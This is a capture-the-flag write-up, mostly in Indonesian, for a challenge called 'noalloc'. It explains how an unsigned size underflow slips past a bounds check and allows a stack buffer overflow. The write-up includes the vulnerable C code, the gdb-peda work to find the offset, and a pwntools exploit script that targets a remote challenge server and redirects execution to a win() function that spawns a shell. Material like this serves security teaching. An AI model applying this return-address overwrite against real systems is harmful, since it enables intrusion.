# Speedrun_seccon —> noalloc

## Description:

Don't worry, I'm careful of buffer overflow.

大丈夫バッファオーバーフローには気を付けたから。

## Problem:

Pengecekan `buffer overflow` yang `useless`. So, basically just a classic buffer overflow challenge.

```c
int main() {
  unsigned size;
  char buf[0x80];

  /* Input size */
  printf("size: ");
  scanf("%d%*c", &size);
  if (size > 0x80) {
    puts("*** buffer overflow ***");
    return 1;
  }

  /* Input data */
  printf("data: ");
  readn(buf, size-1);

  return 0;
}
```

Kita tinggal memanggil fungsi `win` yang sudah tersedia untuk mendapatkan `shell`

```c
void win() {
  /* Call me :pleading_face: */
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}
```

## Solution:

Jalankan program menggunakan `gdb` lalu gunakan `init-peda` lalu kita cari `offset` untuk overwrite return address.

```bash
gdb ./chall -q 
Reading symbols from ./chall...
(No debugging symbols found in ./chall)
(gdb) init-peda
gdb-peda$ pattern 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
....

gdb-peda$ pattern offset pAATAAqAAUA
pAATAAqAAUA found at offset: 153
```

Setelah didapatkan offsetnya, langsung buat script exploitnya.

```python
from pwn import *

LOCAL = True

if LOCAL : r = process("./chall")
else:  r = remote("133.242.227.104",9991)

elf = ELF("./chall",checksec=False)

payload = b"A"*153
payload += p64(elf.symbols['win'])

r.sendlineafter(": ",payload)
r.interactive()
```

## Flag:

`RTACON{1nt3g3r_oOoOoOv3rfloOoOoOw}`